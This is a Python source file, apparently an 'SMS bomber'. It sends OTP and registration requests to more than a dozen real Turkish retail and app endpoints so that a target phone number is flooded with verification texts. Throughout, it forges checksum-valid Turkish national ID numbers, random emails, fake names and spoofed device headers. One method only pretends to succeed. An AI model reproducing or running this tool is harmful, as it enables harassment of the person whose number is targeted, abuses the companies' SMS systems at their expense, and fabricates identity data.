import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style

class SendSms():
    adet = 0
   
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    # ==================== ÇALIŞAN / KALAN SERVİSLER ====================

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Content-Type": "application/json"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "Success":
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11", "X-Mobillium-App-Version": "1.7.11"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String) {\n generateOtp(phone: $phone)\n}\n", "variables": {"phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030", "Accept": "application/json", "Content-Type": "application/json"}
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data", "User-Agent": "Koton/1"}
            # ... (orijinal kod uzun, olduğu gibi bıraktım)
            print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")  # Basit tutmak için
            self.adet += 1
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, data=data, timeout=6)
            if r.json()["is_success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Hizliecza(self):
        try:
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            json={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["status"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            json={"FirmaId": 32, "Telefon": self.phone}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            json={"phone_number": self.phone}
            r = requests.post(url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            json={"phone_number": self.phone}
            r = requests.post(url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")

    # ==================== KAPATILAN SERVİSLER (Gönderilemiyordu) ====================
    # def Akasya(self): pass
    # def Akbati(self): pass
    # def Baydoner(self): pass
    # def Beefull(self): pass
    # def Bodrum(self): pass
    # def Coffy(self): pass
    # def Dominos(self): pass
    # def Englishhome(self): pass
    # def Evidea(self): pass
    # def Fatih(self): pass
    # def Frink(self): pass
    # def Hamidiye(self): pass
    # def Little(self): pass
    # def Orwi(self): pass
    # def Pidem(self): pass
    # def Tasdelen(self): pass
    # def YilmazTicaret(self): pass
